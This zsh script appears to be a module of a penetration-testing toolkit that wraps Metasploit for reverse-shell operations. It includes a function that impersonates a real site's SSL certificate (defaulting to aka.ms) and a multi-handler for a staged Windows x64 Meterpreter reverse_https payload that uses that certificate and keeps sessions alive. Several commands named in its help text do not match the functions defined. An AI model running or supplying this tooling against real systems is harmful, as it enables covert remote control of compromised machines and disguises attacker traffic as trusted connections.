#!/usr/bin/env zsh

############################################################# 
# nb-shell-handlers-msf
#############################################################
nb-shell-handlers-msf-help() {
    cat << "DOC" | bat --plain --language=help

nb-shell-handlers-msf
---------------------
The shell-handlers-msf namespace provides commands for spawning 
reverse shell connections using metasploit.

Commands
--------
nb-shell-handlers-msf-install            installs dependencies
nb-shell-handlers-msf-ssl-gen            impersonate a real SSL certificate for use in reverse shells
nb-shell-handlers-msf-w64-multi-https    multi-handler for staged windows/x64/meterpreter/reverse_https payload
nb-shell-handlers-msf-listener           set up metasploit listener
nb-shell-handlers-msf-payload            set up metasploit payload

DOC
}

nb-shell-handlers-install-msf() {
    __info "Running $0..."
    __pkgs metasploit
}

nb-shell-handlers-msf-ssl-gen() {
    __ask "Enter the hostname of the site to impersonate"
    local r && __prefill r SITE aka.ms
    local cmd="use auxiliary/gather/impersonate_ssl; set RHOST ${r}; run; exit "
    __info "Use nb-vars-global-set-ssl-shell-cert to the path of the .pem file"
    print -z "msfconsole -n -q -x \"${cmd}\" "
}

nb-shell-handlers-msf-w64-https() {
    nb-vars-set-lhost
    nb-vars-set-lport
    __msf << VAR
use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_https;
set LHOST ${__LHOST};
set LPORT ${__LPORT};
set HANDLERSSLCERT ${__SHELL_SSL_CERT};
set EXITONSESSION false
run;
exit
VAR

}
